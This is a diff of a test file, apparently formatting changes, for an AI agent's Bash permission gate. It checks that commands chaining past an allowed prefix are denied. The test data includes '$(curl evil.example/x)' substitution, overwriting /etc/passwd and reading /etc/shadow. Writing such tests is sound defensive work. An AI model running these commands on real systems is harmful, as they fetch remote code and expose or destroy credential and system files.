@@ -314,12 +314,15 @@ describe('agent exec: canUseTool gate', () => {
       'monomind org list $(curl evil.example/x)',
       'monomind org list > /etc/passwd',
       'monomind org list < /etc/shadow',
-    ])('denies a command chaining/substituting/redirecting past an allowed prefix: %s', async (cmd) => {
-      const canUseTool = await capturedCanUseTool(['monomind org']);
-      await expect(canUseTool('Bash', { command: cmd })).resolves.toMatchObject({
-        behavior: 'deny',
-      });
-    });
+    ])(
+      'denies a command chaining/substituting/redirecting past an allowed prefix: %s',
+      async (cmd) => {
+        const canUseTool = await capturedCanUseTool(['monomind org']);
+        await expect(canUseTool('Bash', { command: cmd })).resolves.toMatchObject({
+          behavior: 'deny',
+        });
+      },
+    );
 
     it('does not false-positive on a quoted ">" that is not real shell redirection', async () => {
       const canUseTool = await capturedCanUseTool(['monomind org']);
@@ -339,7 +342,7 @@ describe('agent exec: canUseTool gate', () => {
       await expect(
         canUseTool('Bash', {
           command:
-            "monoagentcli org create-json myorg --project '/p' --json '{\"goal\":\"grow revenue & cut costs; ship fast | iterate\"}'",
+            'monoagentcli org create-json myorg --project \'/p\' --json \'{"goal":"grow revenue & cut costs; ship fast | iterate"}\'',
         }),
       ).resolves.toMatchObject({ behavior: 'allow' });
     });
@@ -348,7 +351,8 @@ describe('agent exec: canUseTool gate', () => {
       const canUseTool = await capturedCanUseTool(['monoagentcli org']);
       await expect(
         canUseTool('Bash', {
-          command: "monoagentcli org create-json myorg --project '/p' --json '{\"goal\":\"price = $(cost)\"}'",
+          command:
+            'monoagentcli org create-json myorg --project \'/p\' --json \'{"goal":"price = $(cost)"}\'',
         }),
       ).resolves.toMatchObject({ behavior: 'allow' });
     });
